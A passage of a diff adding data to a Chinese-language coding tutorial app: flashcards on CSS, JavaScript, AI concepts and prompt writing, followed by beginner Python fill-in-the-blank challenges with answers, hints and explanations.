+            icon: "🎨",
+            courseType: "css",
+            cards: [
+                { front: "什么是CSS？", back: "CSS = Cascading Style Sheets\n层叠样式表\n\n用于控制网页的样式和布局", code: "/* 选择器 { 属性: 值; } */\nbody {\n    background-color: #f0f0f0;\n    font-family: Arial, sans-serif;\n}" },
+                { front: "CSS选择器", back: "常用选择器：\n• 元素选择器: p\n• 类选择器: .class\n• ID选择器: #id\n• 后代选择器: div p", code: "/* 元素选择器 */\np { color: blue; }\n\n/* 类选择器 */\n.highlight { background: yellow; }\n\n/* ID选择器 */\n#header { font-size: 24px; }\n\n/* 后代选择器 */\nnav a { text-decoration: none; }" },
+                { front: "盒模型", back: "CSS盒模型包含：\n• content - 内容\n• padding - 内边距\n• border - 边框\n• margin - 外边距", code: ".box {\n    width: 200px;\n    padding: 20px;\n    border: 1px solid #ccc;\n    margin: 10px;\n    \n    /* 总宽度 = 200+20*2+1*2+10*2 = 262px */\n    box-sizing: border-box;  /* 让width包含padding和border */\n}" }
+            ]
+        },
+        {
+            category: "CSS布局",
+            icon: "📐",
+            courseType: "css",
+            cards: [
+                { front: "Flexbox弹性布局", back: "Flexbox用于一维布局\n\n• display: flex\n• justify-content 主轴对齐\n• align-items 交叉轴对齐", code: ".container {\n    display: flex;\n    justify-content: space-between;\n    align-items: center;\n}\n\n.item {\n    flex: 1;  /* 平均分配空间 */\n}" },
+                { front: "Grid网格布局", back: "Grid用于二维布局\n\n• display: grid\n• grid-template-columns\n• grid-template-rows", code: ".grid {\n    display: grid;\n    grid-template-columns: repeat(3, 1fr);\n    grid-gap: 20px;\n}\n\n/* 3列等宽网格，间距20px */" },
+                { front: "定位position", back: "position属性：\n• static 默认\n• relative 相对定位\n• absolute 绝对定位\n• fixed 固定定位", code: ".parent {\n    position: relative;\n}\n\n.child {\n    position: absolute;\n    top: 10px;\n    right: 10px;\n}" }
+            ]
+        },
+        {
+            category: "CSS动画",
+            icon: "✨",
+            courseType: "css",
+            cards: [
+                { front: "transition过渡", back: "transition用于平滑过渡\n\n属性：\n• transition-property\n• transition-duration\n• transition-timing-function", code: ".button {\n    background: blue;\n    transition: all 0.3s ease;\n}\n\n.button:hover {\n    background: red;\n    transform: scale(1.1);\n}" },
+                { front: "animation动画", back: "animation用于复杂动画\n\n• @keyframes定义动画\n• animation属性应用", code: "@keyframes bounce {\n    0%, 100% { transform: translateY(0); }\n    50% { transform: translateY(-20px); }\n}\n\n.ball {\n    animation: bounce 1s infinite;\n}" }
+            ]
+        },
+        // ========== JavaScript ==========
+        {
+            category: "JS基础",
+            icon: "✨",
+            courseType: "javascript",
+            cards: [
+                { front: "JavaScript简介", back: "JavaScript是网页的编程语言\n\n用途：\n• 网页交互\n• 动态效果\n• 表单验证\n• 后端开发(Node.js)", code: "// 变量声明\nlet name = '张三';\nconst PI = 3.14;\nvar age = 18;  // 旧写法\n\nconsole.log('Hello JavaScript!');" },
+                { front: "数据类型", back: "JS数据类型：\n\n基本类型：\n• string, number, boolean\n• null, undefined, symbol\n\n引用类型：object", code: "let str = \"Hello\";\nlet num = 123;\nlet bool = true;\nlet arr = [1, 2, 3];\nlet obj = { name: '张三', age: 18 };\n\nconsole.log(typeof str);  // string" },
+                { front: "函数", back: "JS函数定义方式：\n• function关键字\n• 箭头函数\n• 函数表达式", code: "// 普通函数\nfunction add(a, b) {\n    return a + b;\n}\n\n// 箭头函数\nconst multiply = (a, b) => a * b;\n\n// 函数表达式\nconst greet = function(name) {\n    console.log('Hello ' + name);\n};" }
+            ]
+        },
+        {
+            category: "DOM操作",
+            icon: "🌐",
+            courseType: "javascript",
+            cards: [
+                { front: "什么是DOM？", back: "DOM = Document Object Model\n文档对象模型\n\nJS通过DOM操作网页元素", code: "// 获取元素\nlet el = document.getElementById('myId');\nlet els = document.querySelectorAll('.myClass');\n\n// 修改内容\nel.innerHTML = '新内容';\nel.textContent = '纯文本';" },
+                { front: "事件处理", back: "事件是用户或浏览器的动作\n\n常见事件：\n• click 点击\n• submit 提交\n• keydown 按键\n• load 加载完成", code: "// 方式1：addEventListener\nbtn.addEventListener('click', function() {\n    alert('点击了按钮');\n});\n\n// 方式2：箭头函数\nbtn.addEventListener('click', () => {\n    console.log('clicked');\n});" },
+                { front: "修改样式", back: "JS可以动态修改CSS样式\n\n• style属性\n• classList操作类名", code: "// 直接修改style\nel.style.color = 'red';\nel.style.backgroundColor = 'blue';\n\n// 操作class\nel.classList.add('active');\nel.classList.remove('hidden');\nel.classList.toggle('selected');" }
+            ]
+        },
+        {
+            category: "ES6+新特性",
+            icon: "🚀",
+            courseType: "javascript",
+            cards: [
+                { front: "let和const", back: "ES6新增变量声明：\n\n• let - 块级作用域变量\n• const - 常量，不可重新赋值\n• 不要再用var", code: "// let 块级作用域\nif (true) {\n    let x = 10;\n}\nconsole.log(x);  // 报错\n\n// const 常量\nconst PI = 3.14;\nPI = 3;  // 报错" },
+                { front: "模板字符串", back: "使用反引号 ` 定义字符串\n\n• 支持多行\n• 支持变量插值 ${}", code: "const name = '张三';\nconst age = 18;\n\n// 模板字符串\nconst msg = `我是${name}，今年${age}岁`;\n\n// 多行字符串\nconst html = `\n    <div>\n        <h1>${name}</h1>\n    </div>\n`;" },
+                { front: "解构赋值", back: "快速从数组或对象中提取值\n\n• 数组解构\n• 对象解构", code: "// 数组解构\nconst [a, b] = [1, 2];\n\n// 对象解构\nconst { name, age } = { name: '张三', age: 18 };\n\n// 函数参数解构\nfunction greet({ name }) {\n    console.log(`Hello ${name}`);\n}" },
+                { front: "Promise异步", back: "Promise用于处理异步操作\n\n• 三种状态：pending/fulfilled/rejected\n• then/catch处理结果", code: "// 创建Promise\nconst p = new Promise((resolve, reject) => {\n    setTimeout(() => resolve('成功'), 1000);\n});\n\n// 使用\np.then(result => console.log(result))\n .catch(error => console.log(error));\n\n// async/await\nasync function getData() {\n    const result = await p;\n    console.log(result);\n}" }
+            ]
+        },
+        // ========== AI人工智能 ==========
+        {
+            category: "AI基础概念",
+            icon: "🤖",
+            courseType: "ai",
+            cards: [
+                { front: "什么是人工智能？", back: "人工智能(AI)是让机器模拟人类智能的技术\n\n主要分支：\n• 机器学习\n• 深度学习\n• 自然语言处理\n• 计算机视觉", code: "# AI的三个层次\n1. 弱AI - 专注特定任务\n   如：语音助手、推荐系统\n\n2. 强AI - 通用人类智能\n   目前尚未实现\n\n3. 超级AI - 超越人类\n   理论概念" },
+                { front: "机器学习 vs 深度学习", back: "机器学习：从数据中学习规律\n深度学习：使用神经网络的机器学习\n\n深度学习是机器学习的子集", code: "# 机器学习流程\n数据收集 → 数据清洗 → 特征工程\n    ↓\n模型训练 → 模型评估 → 部署应用\n\n# 深度学习特点\n• 自动提取特征\n• 需要大量数据\n• 需要GPU算力" },
+                { front: "监督学习 vs 无监督学习", back: "监督学习：有标签数据\n• 分类：预测类别\n• 回归：预测数值\n\n无监督学习：无标签数据\n• 聚类：发现群组\n• 降维：简化数据", code: "# 监督学习例子\n图片 → [猫/狗] 分类\n房屋特征 → 价格预测\n\n# 无监督学习例子\n客户数据 → 用户分群\n高维数据 → PCA降维" }
+            ]
+        },
+        {
+            category: "神经网络",
+            icon: "🧠",
+            courseType: "ai",
+            cards: [
+                { front: "什么是神经网络？", back: "神经网络模拟人脑神经元结构\n\n基本组成：\n• 输入层\n• 隐藏层\n• 输出层\n• 权重和偏置", code: "# 简单神经网络结构\n输入层(特征) → 隐藏层 → 输出层(预测)\n    x1 ─┐\n    x2 ─┼─→ [神经元] ─→ y\n    x3 ─┘\n\n# 每个连接都有权重w\ny = f(w1*x1 + w2*x2 + w3*x3 + b)" },
+                { front: "激活函数", back: "激活函数引入非线性\n\n常用激活函数：\n• ReLU: max(0, x)\n• Sigmoid: 1/(1+e^-x)\n• Tanh: 双曲正切\n• Softmax: 多分类", code: "# ReLU - 最常用\ndef relu(x):\n    return max(0, x)\n\n# Sigmoid - 输出0-1\ndef sigmoid(x):\n    return 1 / (1 + np.exp(-x))\n\n# Softmax - 多分类概率\nprobs = softmax([2.0, 1.0, 0.1])\n# [0.7, 0.2, 0.1]" },
+                { front: "反向传播", back: "反向传播是训练神经网络的核心算法\n\n步骤：\n1. 前向传播计算输出\n2. 计算损失\n3. 反向传播梯度\n4. 更新权重", code: "# 训练循环\nfor epoch in range(epochs):\n    # 前向传播\n    pred = model(x)\n    \n    # 计算损失\n    loss = loss_fn(pred, y)\n    \n    # 反向传播\n    loss.backward()\n    \n    # 更新权重\n    optimizer.step()" }
+            ]
+        },
+        {
+            category: "Prompt工程",
+            icon: "💬",
+            courseType: "ai",
+            cards: [
+                { front: "什么是Prompt？", back: "Prompt是给AI模型的输入指令\n\n好的Prompt应该：\n• 清晰具体\n• 提供上下文\n• 说明期望格式\n• 给出示例", code: "# 差的Prompt\n\"写一篇文章\"\n\n# 好的Prompt\n\"请写一篇关于Python入门的技术博客，\n要求：\n- 面向初学者\n- 500字左右\n- 包含代码示例\n- 结构：引言-正文-总结\"" },
+                { front: "Prompt技巧", back: "提升Prompt效果的技巧：\n\n1. 角色扮演\n2. 分步思考\n3. 少样本学习\n4. 链式思维", code: "# 角色扮演\n\"你是一个资深Python开发者...\"\n\n# 分步思考\n\"请一步步分析这个问题...\"\n\n# 少样本学习\n\"示例1: 输入→输出\n示例2: 输入→输出\n现在处理: 新输入→?\"\n\n# 链式思维(CoT)\n\"让我们逐步思考...\"" },
+                { front: "常用AI工具", back: "主流AI工具：\n\n• ChatGPT - 对话AI\n• Claude - 长文本AI\n• Midjourney - 图像生成\n• GitHub Copilot - 代码助手\n• Stable Diffusion - 开源图像", code: "# API调用示例\nimport openai\n\nresponse = openai.ChatCompletion.create(\n    model=\"gpt-3.5-turbo\",\n    messages=[\n        {\"role\": \"system\", \"content\": \"你是助手\"},\n        {\"role\": \"user\", \"content\": \"你好\"}\n    ]\n)" }
+            ]
+        }
+    ],
+
+    // 编程挑战数据
+    challenges: [
+        {
+            id: 1,
+            title: "初出茅庐",
+            description: "学会打印输出",
+            difficulty: 1,
+            xp: 10,
+            question: "补全代码，让程序输出 'Hello Python'",
+            template: "___('Hello Python')",
+            answer: "print",
+            hint: "Python中用于输出的函数是？",
+            explanation: "📌 print() 是Python最基础也是最常用的内置函数之一。\n\n🔹 作用：将内容输出到控制台（终端）\n🔹 语法：print(内容)\n🔹 可以输出：字符串、数字、变量、表达式结果\n\n💡 小技巧：\n• print('你好') - 输出字符串\n• print(123) - 输出数字\n• print(1 + 2) - 输出计算结果 3\n• print(name) - 输出变量的值\n\n🎯 在你的【地标管理系统】项目中，print() 常用于调试，查看变量值是否正确。"
+        },
+        {
+            id: 2,
+            title: "变量初体验",
+            description: "创建并使用变量",
+            difficulty: 1,
+            xp: 15,
+            question: "补全代码，创建一个存储年龄的变量",
+            template: "___ = 18\\nprint(f'我今年{age}岁')",
+            answer: "age",
+            hint: "变量名应该能表达它存储的内容",
+            explanation: "📌 变量是编程中最基础的概念，用来存储和管理数据。\n\n🔹 语法：变量名 = 值\n🔹 命名规则：\n  • 只能包含字母、数字、下划线\n  • 不能以数字开头\n  • 区分大小写（age 和 Age 是不同变量）\n\n💡 命名建议：\n• 使用有意义的名字：age 比 a 好\n• 多个单词用下划线：user_name\n• 避免使用Python关键字：if、for、class等\n\n🎯 在你的项目中：\nself.current_index = 0  # 存储当前索引\nself.data = None  # 存储数据"
+        },
+        {
+            id: 3,
+            title: "循环达人",
+            description: "使用for循环",
+            difficulty: 2,
+            xp: 20,
+            question: "补全代码，遍历列表中的每个水果",
+            template: "fruits = ['苹果', '香蕉', '橙子']\n___ fruit in fruits:\n    print(fruit)",
+            answer: "for",
+            hint: "遍历序列最常用的循环是？",
+            explanation: "📌 for循环是Python中最常用的循环结构，用于遍历序列中的每个元素。\n\n🔹 语法：for 变量 in 可迭代对象:\n🔹 可迭代对象包括：列表、字符串、字典、range()等\n\n💡 常见用法：\n• for i in range(5): → 循环5次(0,1,2,3,4)\n• for char in 'hello': → 遍历每个字符\n• for key in dict: → 遍历字典的键\n\n🔄 与while的区别：\n• for：知道要循环多少次\n• while：不确定次数，根据条件判断\n\n🎯 在你的【爬虫项目】中：\nfor item in soup.find_all('a'):\n    print(item.text)  # 遍历所有链接"
+        },
+        {
+            id: 4,
+            title: "列表操作",
+            description: "向列表添加元素",
+            difficulty: 2,
+            xp: 20,
+            question: "补全代码，向列表末尾添加 '葡萄'",
+            template: "fruits = ['苹果', '香蕉']\nfruits.___('葡萄')\nprint(fruits)",
+            answer: "append",
+            hint: "添加到末尾的方法叫什么？",
+            explanation: "📌 append() 是列表最常用的方法之一，用于在末尾添加元素。\n\n🔹 列表常用方法对比：\n• append(x) - 末尾添加一个元素\n• extend([x,y]) - 末尾添加多个元素\n• insert(i, x) - 在指定位置插入\n• remove(x) - 删除第一个匹配的元素\n• pop() - 删除并返回最后一个元素\n\n💡 注意区别：\nlist.append([1,2]) → [原内容, [1,2]] 添加整个列表\nlist.extend([1,2]) → [原内容, 1, 2] 添加每个元素\n\n🎯 在你的项目中：\nself.undo_stack.append(状态)  # 保存撤销历史"
+        },
+        {
+            id: 5,
+            title: "字典高手",
+            description: "访问字典的值",
+            difficulty: 2,
+            xp: 25,
+            question: "补全代码，获取person字典中的name值",
+            template: "person = {'name': '小明', 'age': 18}\nname = person[___]\nprint(name)",
+            answer: "'name'",
+            hint: "字典用键来访问值，键需要用引号包围",
+            explanation: "📌 字典(dict)是Python中最重要的数据结构之一，存储键值对。\n\n🔹 访问方式：\n• dict['key'] - 键不存在会报错\n• dict.get('key') - 键不存在返回None\n• dict.get('key', 默认值) - 不存在返回默认值\n\n💡 常用操作：\n• dict['new_key'] = value  # 添加/修改\n• del dict['key']  # 删除\n• 'key' in dict  # 检查键是否存在\n• dict.keys()  # 获取所有键\n• dict.values()  # 获取所有值\n\n🎯 在你的项目中，config.json就是用字典存储配置：\nconfig = {'excel_path': '数据.xlsx', 'image_folder': '图片'}"
+        },
+        {
+            id: 6,
+            title: "函数入门",
+            description: "定义一个函数",
+            difficulty: 2,
+            xp: 25,
+            question: "补全代码，定义一个名为greet的函数",
+            template: "___ greet(name):\n    return f'你好，{name}！'\n\nprint(greet('小明'))",
+            answer: "def",
+            hint: "定义函数的关键字是？",
+            explanation: "📌 函数是组织代码的基本单位，可以重复使用。\n\n🔹 语法：def 函数名(参数):\n🔹 return 用于返回结果（可选）\n\n💡 函数的好处：\n• 代码复用 - 写一次，用多次\n• 逻辑清晰 - 每个函数做一件事\n• 易于维护 - 修改一处，处处生效\n\n📝 参数类型：\n• def func(a, b): - 必需参数\n• def func(a=1): - 默认参数\n• def func(*args): - 可变参数\n\n🎯 在你的项目中：\ndef load_image(self, path):\n    '''加载图片的函数'''\n    return Image.open(path)"
+        },
+        {
+            id: 7,
+            title: "条件判断",
+            description: "使用if语句",
+            difficulty: 2,
+            xp: 20,
+            question: "补全代码，判断年龄是否大于等于18",
+            template: "age = 20\n___ age >= 18:\n    print('成年人')",
+            answer: "if",
+            hint: "条件判断的关键字是？",
+            explanation: "📌 if语句是程序做决策的核心，根据条件执行不同代码。\n\n🔹 完整结构：\nif 条件1:\n    执行代码1\nelif 条件2:\n    执行代码2\nelse:\n    其他情况\n\n💡 条件表达式：\n• == 等于  != 不等于\n• > < >= <= 大小比较\n• and 且  or 或  not 非\n• in 包含  is 同一对象\n\n🎯 在你的项目中：\nif self.current_index < len(self.data):\n    self.show_next()\nelse:\n    print('已经是最后一条')"
+        },
+        {
+            id: 8,
+            title: "文件操作",
+            description: "打开并读取文件",
+            difficulty: 3,
+            xp: 30,
+            question: "补全代码，以只读模式打开文件",
+            template: "with open('data.txt', ___) as f:\n    content = f.read()\n    print(content)",
+            answer: "'r'",
+            hint: "只读模式用什么字母表示？",
+            explanation: "📌 文件操作是程序与外部数据交互的重要方式。\n\n🔹 打开模式：\n• 'r' - 只读（默认），文件必须存在\n• 'w' - 写入，会清空原内容\n• 'a' - 追加，在末尾添加\n• 'rb'/'wb' - 二进制模式（图片等）\n\n💡 with语句的好处：\n自动关闭文件，即使发生错误也能正确关闭\n\n📝 读取方法：\n• f.read() - 读取全部内容\n• f.readline() - 读取一行\n• f.readlines() - 读取所有行到列表\n\n🎯 在你的项目中读取配置：\nwith open('config.json', 'r', encoding='utf-8') as f:\n    config = json.load(f)"
+        },
+        {
+            id: 9,
+            title: "异常处理",
+            description: "捕获并处理错误",
+            difficulty: 3,
+            xp: 35,
+            question: "补全代码，捕获可能发生的异常",
+            template: "___:\n    result = 10 / 0\nexcept ZeroDivisionError:\n    print('不能除以零！')",
+            answer: "try",
+            hint: "尝试执行可能出错的代码用什么关键字？",
+            explanation: "📌 异常处理让程序更健壮，不会因为错误而崩溃。\n\n🔹 完整结构：\ntry:\n    可能出错的代码\nexcept 异常类型:\n    处理错误\nelse:\n    没有异常时执行\nfinally:\n    无论如何都执行\n\n💡 常见异常类型：\n• FileNotFoundError - 文件不存在\n• ValueError - 值错误\n• TypeError - 类型错误\n• KeyError - 字典键不存在\n• IndexError - 索引越界\n\n🎯 在你的爬虫项目中：\ntry:\n    response = requests.get(url)\nexcept requests.RequestException:\n    print('网络请求失败')"
+        },
+        {
+            id: 10,
+            title: "类的定义",
+            description: "创建一个类",
+            difficulty: 3,
+            xp: 40,
+            question: "补全代码，定义一个名为Person的类",
+            template: "___ Person:\n    def __init__(self, name):\n        self.name = name",
+            answer: "class",
+            hint: "定义类的关键字是？",
+            explanation: "📌 类是面向对象编程的核心，用于创建对象的模板。\n\n🔹 基本概念：\n• class - 定义类（模板）\n• __init__ - 构造函数，创建对象时自动调用\n• self - 代表对象自身，必须是第一个参数\n• 属性 - 对象的数据（self.name）\n• 方法 - 对象的行为（函数）\n\n💡 为什么用类？\n• 封装数据和行为在一起\n• 代码更有组织性\n• 可以创建多个相似对象\n\n🎯 你的地标管理系统就是一个类：\nclass LandmarkApp:\n    def __init__(self):\n        self.root = tk.Tk()\n        self.data = None"
+        },
+        {
+            id: 11,
+            title: "Tkinter窗口",
+            description: "创建GUI窗口",
+            difficulty: 3,
+            xp: 35,
+            question: "补全代码，创建Tkinter主窗口",
+            template: "import tkinter as tk\n\nroot = tk.___()\nroot.title('我的窗口')\nroot.mainloop()",
+            answer: "Tk",
+            hint: "创建主窗口的类名是？",
+            explanation: "📌 Tkinter是Python自带的GUI库，无需额外安装。\n\n🔹 创建窗口三步曲：\n1. root = tk.Tk()  # 创建主窗口\n2. 添加组件（按钮、标签等）\n3. root.mainloop()  # 进入事件循环\n\n💡 常用窗口设置：\n• root.title('标题')\n• root.geometry('800x600')  # 宽x高\n• root.resizable(True, True)  # 可调整大小\n• root.configure(bg='white')  # 背景色\n\n📝 mainloop()的作用：\n让窗口保持显示，监听用户操作（点击、输入等）\n\n🎯 你的地标管理系统就是这样创建窗口的！"
+        },
+        {
+            id: 12,
+            title: "Pandas读取",
+            description: "读取Excel文件",
+            difficulty: 3,
+            xp: 35,
+            question: "补全代码，读取Excel文件",
+            template: "import pandas as pd\n\ndf = pd.___('data.xlsx')\nprint(df.head())",
+            answer: "read_excel",
+            hint: "读取Excel的函数以read_开头",
+            explanation: "📌 Pandas是Python数据分析的核心库。\n\n🔹 读取不同格式：\n• pd.read_excel('文件.xlsx')\n• pd.read_csv('文件.csv')\n• pd.read_json('文件.json')"
+        },
+        {
+            id: 13,
+            title: "网络请求",
+            description: "发送HTTP请求",
+            difficulty: 3,
+            xp: 35,
+            question: "补全代码，发送GET请求",
+            template: "import requests\n\nresponse = requests.___(url)\nprint(response.text)",
+            answer: "get",
+            hint: "最常用的HTTP请求方法是？",
+            explanation: "📌 requests库让Python发送网络请求变得超级简单。\n\n🔹 HTTP请求方法：\n• GET - 获取数据（最常用）\n• POST - 提交数据\n• PUT - 更新数据\n• DELETE - 删除数据\n\n💡 response对象常用属性：\n• response.text - 文本内容\n• response.json() - JSON转字典\n• response.status_code - 状态码(200=成功)\n• response.headers - 响应头\n\n📝 添加请求头防止被拦截：\nheaders = {'User-Agent': 'Mozilla/5.0...'}\nresponse = requests.get(url, headers=headers)\n\n🎯 这就是你爬虫项目的核心！"
+        },
+        {
+            id: 14,
+            title: "HTML解析",
+            description: "使用BeautifulSoup",
+            difficulty: 4,
+            xp: 45,
+            question: "补全代码，查找所有的a标签",
+            template: "from bs4 import BeautifulSoup\n\nsoup = BeautifulSoup(html, 'html.parser')\nlinks = soup.___('a')",
+            answer: "find_all",
+            hint: "查找所有匹配元素的方法是？",
+            explanation: "📌 BeautifulSoup解析HTML。\n\n🔹 查找方法：\n• find('tag') - 找第一个\n• find_all('tag') - 找所有\n• select('css') - CSS选择器"
+        },
+        {
+            id: 15,
+            title: "正则表达式",
+            description: "匹配文本模式",
+            difficulty: 4,
+            xp: 50,
+            question: "补全代码，在文本中查找所有数字",
+            template: "import re\n\ntext = '我有3个苹果和5个橙子'\nnumbers = re.___(r'\\d+', text)\nprint(numbers)",
+            answer: "findall",
+            hint: "查找所有匹配的方法是？",
+            explanation: "📌 正则表达式是文本处理的终极武器。\n\n🔹 常用方法：\n• re.findall() - 找所有匹配\n• re.search() - 找第一个\n• re.sub() - 替换\n\n💡 常用符号：\\d数字 \\w字母 +一个或多个"
+        },
+        // ===== 字符串操作 =====
+        {
+            id: 16,
+            title: "字符串切片",
+            description: "提取字符串片段",
+            difficulty: 1,
+            xp: 10,
+            question: "补全代码，获取字符串的前3个字符",
+            template: "text = 'Hello World'\nresult = text[___]\nprint(result)  # 输出: Hel",
+            answer: ":3",
+            hint: "切片语法 [起始:结束]，省略起始表示从0开始",
+            explanation: "📌 字符串切片用于提取子串。\n\n🔹 语法：str[start:end:step]\n• text[:3] - 前3个字符\n• text[3:] - 第3个之后\n• text[-3:] - 最后3个\n• text[::2] - 每隔一个取"
+        },
+        {
+            id: 17,
+            title: "字符串分割",
+            description: "按分隔符拆分",
+            difficulty: 1,
+            xp: 10,
+            question: "补全代码，按逗号分割字符串",
+            template: "text = '苹果,香蕉,橙子'\nfruits = text.___(',')  \nprint(fruits)",
+            answer: "split",
+            hint: "分割字符串的方法是？",
+            explanation: "📌 split()将字符串按分隔符拆分成列表。\n\n🔹 用法：\n• 'a,b,c'.split(',') → ['a','b','c']\n• 'hello world'.split() → 按空格分割\n\n🎯 爬虫中常用来处理数据"
+        },
+        {
+            id: 18,
+            title: "字符串拼接",
+            description: "合并多个字符串",
+            difficulty: 1,
+            xp: 10,
+            question: "补全代码，用'-'连接列表中的元素",
+            template: "words = ['2024', '01', '15']\ndate = '-'.___(words)\nprint(date)  # 2024-01-15",
+            answer: "join",
+            hint: "join是split的反操作",
+            explanation: "📌 join()是split()的反操作，把列表合并成字符串。\n\n🔹 语法：'分隔符'.join(列表)\n• '-'.join(['a','b']) → 'a-b'\n• ''.join(['H','i']) → 'Hi'"
+        },
+        {
+            id: 19,
+            title: "字符串替换",
+            description: "替换指定内容",
+            difficulty: 1,
+            xp: 10,
+            question: "补全代码，将'World'替换为'Python'",
+            template: "text = 'Hello World'\nresult = text.___('World', 'Python')\nprint(result)",
+            answer: "replace",
+            hint: "替换字符串的方法名？",
+            explanation: "📌 replace()替换字符串中的内容。\n\n🔹 语法：str.replace(旧, 新)\n• 可选第3个参数限制替换次数\n• 原字符串不变，返回新字符串"
+        },
+        {
+            id: 20,
+            title: "去除空白",
+            description: "清理字符串两端",
+            difficulty: 1,
+            xp: 10,
+            question: "补全代码，去除字符串两端的空白",
+            template: "text = '  Hello  '\nresult = text.___()\nprint(result)  # 'Hello'",
+            answer: "strip",
+            hint: "去除两端空白的方法？",
+            explanation: "📌 strip()去除字符串两端的空白字符。\n\n🔹 相关方法：\n• strip() - 两端\n• lstrip() - 左端\n• rstrip() - 右端\n\n🎯 爬虫清理数据时常用"
+        },
+        // ===== 列表进阶 =====
+        {
+            id: 21,
+            title: "列表推导式",
+            description: "快速创建列表",
+            difficulty: 2,
+            xp: 20,
+            question: "补全代码，生成1-5的平方列表",
+            template: "squares = [x**2 ___ x in range(1, 6)]\nprint(squares)  # [1, 4, 9, 16, 25]",
+            answer: "for",
+            hint: "列表推导式的语法是 [表达式 for 变量 in 序列]",
+            explanation: "📌 列表推导式是创建列表的简洁方式。\n\n🔹 语法：[表达式 for 变量 in 序列]\n• [x*2 for x in range(5)] → [0,2,4,6,8]\n\n💡 还可以加条件：\n• [x for x in range(10) if x%2==0]"
+        },
+        {
+            id: 22,
+            title: "列表排序",
+            description: "对列表进行排序",
+            difficulty: 2,
+            xp: 15,
+            question: "补全代码，对列表进行升序排序",
+            template: "nums = [3, 1, 4, 1, 5]\nnums.___()\nprint(nums)",
+            answer: "sort",
+            hint: "原地排序的方法？",
+            explanation: "📌 排序有两种方式：\n\n🔹 sort() - 原地排序，修改原列表\n🔹 sorted() - 返回新列表，原列表不变\n\n💡 降序：sort(reverse=True)"
+        },
+        {
+            id: 23,
+            title: "列表长度",
+            description: "获取元素个数",
+            difficulty: 1,
+            xp: 10,
+            question: "补全代码，获取列表的长度",
+            template: "fruits = ['苹果', '香蕉', '橙子']\ncount = ___(fruits)\nprint(count)  # 3",
+            answer: "len",
+            hint: "获取长度的内置函数？",
+            explanation: "📌 len()获取序列的长度。\n\n🔹 适用于：列表、字符串、字典、元组等\n• len([1,2,3]) → 3\n• len('hello') → 5\n• len({'a':1}) → 1"
+        },
+        {
+            id: 24,
+            title: "列表索引",
+            description: "查找元素位置",
+            difficulty: 2,
+            xp: 15,
+            question: "补全代码，查找元素在列表中的位置",
+            template: "fruits = ['苹果', '香蕉', '橙子']\npos = fruits.___('香蕉')\nprint(pos)  # 1",
+            answer: "index",
+            hint: "查找索引的方法？",
+            explanation: "📌 index()返回元素首次出现的位置。\n\n🔹 注意：元素不存在会报错\n💡 先用 in 判断是否存在：\nif '香蕉' in fruits:\n    pos = fruits.index('香蕉')"
+        },
+        {
+            id: 25,
+            title: "列表反转",
+            description: "颠倒列表顺序",
+            difficulty: 1,
+            xp: 10,
+            question: "补全代码，反转列表",
+            template: "nums = [1, 2, 3]\nnums.___()\nprint(nums)  # [3, 2, 1]",
+            answer: "reverse",
+            hint: "反转列表的方法？",
+            explanation: "📌 reverse()原地反转列表。\n\n🔹 另一种方式：切片反转\nnums[::-1] → 返回新列表"
+        },
+        // ===== 字典进阶 =====
+        {
+            id: 26,
+            title: "字典遍历",
+            description: "遍历键值对",
+            difficulty: 2,
+            xp: 20,
+            question: "补全代码，同时遍历字典的键和值",
+            template: "d = {'a': 1, 'b': 2}\nfor k, v in d.___():\n    print(k, v)",
+            answer: "items",
+            hint: "获取键值对的方法？",
+            explanation: "📌 字典遍历方法：\n\n🔹 dict.keys() - 所有键\n🔹 dict.values() - 所有值\n🔹 dict.items() - 键值对元组"
+        },
+        {
+            id: 27,
+            title: "字典默认值",
+            description: "安全获取值",
+            difficulty: 2,
+            xp: 15,
+            question: "补全代码，获取不存在的键时返回0",
+            template: "d = {'a': 1}\nvalue = d.___('b', 0)\nprint(value)  # 0",
+            answer: "get",
+            hint: "安全获取值的方法？",
+            explanation: "📌 get()安全获取字典值。\n\n🔹 语法：dict.get(key, 默认值)\n• 键存在：返回对应值\n• 键不存在：返回默认值（不报错）"
+        },
+        {
+            id: 28,
+            title: "字典更新",
+            description: "合并字典",
+            difficulty: 2,
+            xp: 15,
+            question: "补全代码，用d2更新d1",
+            template: "d1 = {'a': 1}\nd2 = {'b': 2}\nd1.___(d2)\nprint(d1)  # {'a': 1, 'b': 2}",
+            answer: "update",
+            hint: "更新/合并字典的方法？",
+            explanation: "📌 update()合并字典。\n\n🔹 相同键会被覆盖\n💡 Python 3.9+可以用 | 运算符：\nd3 = d1 | d2"
+        },
+        // ===== 控制流 =====
+        {
+            id: 29,
+            title: "while循环",
+            description: "条件循环",
+            difficulty: 2,
+            xp: 20,
+            question: "补全代码，当i小于5时循环",
+            template: "i = 0\n___ i < 5:\n    print(i)\n    i += 1",
+            answer: "while",
+            hint: "条件循环的关键字？",
+            explanation: "📌 while循环在条件为True时重复执行。\n\n🔹 注意避免死循环\n💡 break可以跳出循环\n💡 continue跳过本次循环"
+        },
+        {
+            id: 30,
+            title: "break语句",
+            description: "跳出循环",
+            difficulty: 2,
+            xp: 15,
+            question: "补全代码，找到5时跳出循环",
+            template: "for i in range(10):\n    if i == 5:\n        ___\n    print(i)",
+            answer: "break",
+            hint: "跳出循环的关键字？",
+            explanation: "📌 break立即终止整个循环。\n\n🔹 只能跳出当前层循环\n🔹 常用于搜索找到目标后停止"
+        },
+        {
+            id: 31,
+            title: "continue语句",
+            description: "跳过本次",
+            difficulty: 2,
+            xp: 15,
+            question: "补全代码，跳过偶数",
+            template: "for i in range(5):\n    if i % 2 == 0:\n        ___\n    print(i)  # 输出1, 3",
+            answer: "continue",
+            hint: "跳过本次循环的关键字？",
+            explanation: "📌 continue跳过本次循环的剩余代码。\n\n🔹 直接进入下一次循环\n🔹 常用于过滤不需要处理的情况"
+        },
+        {
+            id: 32,
+            title: "range函数",
+            description: "生成数字序列",
+            difficulty: 1,
+            xp: 10,
+            question: "补全代码，生成0到4的序列",
+            template: "for i in ___(5):\n    print(i)",
+            answer: "range",
+            hint: "生成数字序列的函数？",
+            explanation: "📌 range()生成数字序列。\n\n🔹 range(5) → 0,1,2,3,4\n🔹 range(1,5) → 1,2,3,4\n🔹 range(0,10,2) → 0,2,4,6,8"
+        },
+        // ===== 函数进阶 =====
+        {
+            id: 33,
+            title: "默认参数",
+            description: "设置参数默认值",
+            difficulty: 2,
+            xp: 20,
+            question: "补全代码，设置name的默认值为'游客'",
+            template: "def greet(name___'游客'):\n    print(f'你好, {name}')\n\ngreet()  # 输出: 你好, 游客",
+            answer: "=",
+            hint: "默认值用什么符号赋值？",
